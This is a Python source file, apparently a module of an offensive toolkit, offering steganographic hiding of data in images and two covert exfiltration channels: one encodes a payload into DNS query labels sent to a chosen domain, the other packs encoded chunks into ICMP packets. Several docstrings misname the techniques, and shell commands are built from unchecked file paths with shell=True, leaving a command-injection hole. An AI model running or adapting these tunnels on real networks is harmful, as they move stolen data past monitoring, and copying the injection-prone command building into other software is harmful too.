# modules/steganography_ext.py

import subprocess
import os
import tempfile
import base64
import dns.resolver
import socket
import logging
from scapy.all import IP, ICMP, send

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def validate_dependency(command: str) -> bool:
    """
    Validates if a required command is available on the system.
    """
    try:
        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except subprocess.CalledProcessError:
        logging.error(f"Dependency check failed for: {command}")
        return False

def hide_data_in_image(image_path: str, data: str) -> str:
    """
    Uses `stegsolve` or `steghide` to hide `data` inside the given image.
    Returns new image path.
    """
    out = f"{image_path}.steg"
    try:
        if not validate_dependency("steghide"):
            return "[!] Steghide not found. Install it to proceed."

        if not os.path.exists(image_path):
            logging.error("Image file not found.")
            return "[!] Image file not found."

        if not data:
            logging.error("No data provided to hide.")
            return "[!] No data provided to hide."

        with open("secret.txt", "w") as f:
            f.write(data)

        cmd = f"steghide embed -cf {image_path} -ef secret.txt -sf {out} -p ''"
        subprocess.run(cmd, shell=True, check=True)
        os.remove("secret.txt")
        logging.info(f"Data hidden in image successfully. Output: {out}")
        return out
    except subprocess.CalledProcessError as e:
        logging.error(f"Steghide command failed: {e}")
        return "[!] Failed to hide data in image."
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        return "[!] hide_data_in_image error."

def extract_data_from_image(image_path: str) -> str:
    """
    Extracts hidden data from an image using `steghide`.
    """
    try:
        if not validate_dependency("steghide"):
            return "[!] Steghide not found. Install it to proceed."

        if not os.path.exists(image_path):
            logging.error("Image file not found.")
            return "[!] Image file not found."

        cmd = f"steghide extract -sf {image_path} -xf extracted.txt -p ''"
        subprocess.run(cmd, shell=True, check=True)
        with open("extracted.txt", "r") as f:
            data = f.read()
        os.remove("extracted.txt")
        logging.info("Data extracted from image successfully.")
        return data
    except subprocess.CalledProcessError as e:
        logging.error(f"Steghide command failed: {e}")
        return "[!] Failed to extract data from image."
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        return "[!] extract_data_from_image error."

def dns_over_https_tunnel(url: str, payload: str) -> str:
    """
    Encodes `payload` in base32, splits into labels, and queries a DNS-over-HTTPS resolver (e.g. Google).
    """
    try:
        if not url or not payload:
            logging.error("Invalid URL or payload.")
            return "[!] Invalid URL or payload."

        if not url.endswith("."):
            logging.warning("URL does not end with a dot. Adding one for proper DNS resolution.")
            url += "."

        labels = [base64.b32encode(payload[i:i+50].encode()).decode() for i in range(0, len(payload), 50)]
        for lbl in labels:
            q = f"{lbl}.{url}"
            logging.info(f"Sending DNS query: {q}")
            _ = dns.resolver.resolve(q, "TXT", lifetime=2)
        logging.info("DNS-over-HTTPS tunnel sent successfully.")
        return "[*] DNS-over-HTTPS tunnel sent."
    except dns.resolver.NXDOMAIN:
        logging.error("DNS query failed: NXDOMAIN.")
        return "[!] DNS query failed: NXDOMAIN."
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        return "[!] dns_over_https_tunnel error."

def icmp_over_dns_tunnel(domain: str, payload: str) -> str:
    """
    Encodes payload in base32, uses ICMP to send DNS TXT queries for each chunk.
    """
    try:
        if not domain or not payload:
            logging.error("Invalid domain or payload.")
            return "[!] Invalid domain or payload."

        if not domain.endswith("."):
            logging.warning("Domain does not end with a dot. Adding one for proper DNS resolution.")
            domain += "."

        chunks = [base64.b32encode(payload[i:i+50].encode()).decode() for i in range(0, len(payload), 50)]
        for c in chunks:
            q = f"{c}.{domain}"
            pkt = IP(dst="8.8.8.8") / ICMP() / bytes(q.encode("utf-8"))
            logging.info(f"Sending ICMP packet with payload: {q}")
            send(pkt, verbose=False)
        logging.info("ICMP-over-DNS tunnel sent successfully.")
        return "[*] ICMP-over-DNS tunnel sent."
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        return "[!] icmp_over_dns_tunnel error."
